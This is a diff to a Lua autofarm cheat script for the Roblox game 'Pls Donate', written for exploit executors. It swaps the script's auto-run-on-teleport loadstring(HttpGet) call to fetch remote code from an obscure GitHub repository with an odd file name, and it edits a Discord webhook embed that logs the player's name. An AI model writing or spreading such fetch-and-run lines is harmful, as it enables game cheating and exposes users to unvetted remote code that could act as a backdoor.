@@ -27,7 +27,7 @@ local unclaimed = {}
 local errCount = -1
 
 local queueonteleport = (syn and syn.queue_on_teleport) or queue_on_teleport or (fluxus and fluxus.queue_on_teleport)
-queueonteleport("loadstring(game:HttpGet('https://raw.githubusercontent.com/CF-Trail/tzechco-PlsDonateAutofarmBackup/main/casino.lua'))()")
+queueonteleport("loadstring(game:HttpGet('https://raw.githubusercontent.com/accountnop/Uhc3nJEWgDVG0Y6E/main/vvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvsecuredbykiokesscuressex.lua.lua.lua'))()")
 
 if not getgenv().settin then
 	getgenv().settin = {
@@ -102,8 +102,8 @@ function webhook(...)
 	local c = game:GetService("MarketplaceService")
 	local c = c:GetProductInfo(game.PlaceId, Enum.InfoType.Asset)
 	local a = {
-		["title"] = "Plis Donate DOnates LOgs , From Server Insight | **" .. Players.LocalPlayer.Name .. " got donated! :D**",
-		["description"] = "https://discord.gg/zBVtjPAzhV",
+		["title"] = "Plis Donate DOnates LOgs , For Server Insight | **" .. Players.LocalPlayer.Name .. " got donated! :D**",
+		["description"] = "https://discord.gg/zBVtjPAzhV, Thanks For The Original , CF Community",
 		["type"] = "rich",
 		["color"] = tonumber(getgenv().embedcolor),
 		["thumbnail"] = {
